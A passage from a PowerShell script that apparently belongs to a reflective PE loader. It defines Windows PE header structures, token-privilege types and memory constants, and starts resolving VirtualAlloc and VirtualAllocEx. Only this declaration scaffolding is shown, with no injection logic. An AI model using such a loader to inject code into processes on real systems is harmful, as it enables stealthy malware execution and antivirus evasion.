		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
